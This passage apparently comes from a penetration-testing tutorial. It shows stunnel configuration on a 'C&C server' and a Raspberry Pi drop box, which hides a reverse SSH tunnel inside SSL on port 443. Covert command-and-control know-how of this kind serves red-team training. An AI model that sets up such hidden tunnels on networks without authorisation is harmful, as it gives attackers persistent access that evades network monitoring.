```
root@kali:/etc/stunnel# cat stunnel.conf
debug = debug
output = /var/log/stunnel.log
[ssh]
accept = 192.168.33.27:443
connect = 127.0.0.1:22
cert = /etc/stunnel/stunnel.pem
```

That is all the configuration that needs to be performed on the server side. Once the client side gets set up, we can test the whole process. Make sure that you restart the stunnel service on the C&C server to take the new settings:

```
service stunnel4 restart
```

If you are running a piece of firewall software on either the C&C server or the Raspberry Pi, you will need to make sure that you have the correct firewall holes open on the firewall for stunnel and the reverse SSH tunnel.

# stunnel setup on the client – Raspberry Pi

Setting up the client side of the stunnel tunnel is very easy. The hardest part again is understanding what to put in the Accept and Connect parameters. Again, I will assume that the stunnel package has already been installed on the Raspberry Pi.

+   1. Copy the `stunnel.pem` file from the C&C server over to the Raspberry Pi.
+   2. Edit the `stunnel.conf` file to reflect the accept and connect IP/Port information as well as letting stunnel know this is a client. This file should be located in `/etc/stunnel/stunnel.conf`. You want to make sure that you set the client to yes since the Pi will act as a client. The accept will be the localhost port you will connect to bring up the tunnel; in this case, this is the ssh session I specify in the startup script. The connect will be the other end of the stunnel tunnel on port 443, since we are using the SSL tunnel to hide this ssh traffic in:

```
root@pi-kali:~# cat /etc/stunnel/stunnel.conf
[ssh]
cert = /etc/stunnel/stunnel.pem
client = yes
accept = 127.0.0.1:8888
connect = 192.168.33.27:443
```